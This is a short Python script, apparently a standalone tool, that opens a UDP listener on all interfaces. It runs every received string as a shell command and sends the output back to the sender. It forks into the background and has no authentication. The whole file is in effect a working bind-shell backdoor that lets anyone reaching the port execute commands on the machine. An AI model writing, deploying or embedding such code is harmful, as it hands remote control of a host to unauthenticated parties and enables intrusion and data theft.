#!/usr/bin/env python3


import socket
import os
from pargs import parse
from net import Packet

if __name__ == "__main__":
    def main():
        args, opt = parse(['p|port|1'])
        port = int(opt['port']) if 'port' in opt else 9000

        sd = socket.socket(type=socket.SOCK_DGRAM)
        sd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sd.bind(('0.0.0.0', port))

        packet = Packet(sd)

        while True:
            data, addr = packet.recv()
            if data['data'] == "exit":
                break
            f = os.popen(data['data'], 'r')
            while True:
                out = f.read(512)
                if not out:
                    break
                packet.send(out, addr, Packet.DATA)
            packet.send("", addr, Packet.QUIT)
            f.close()

    if not os.fork():
        main()

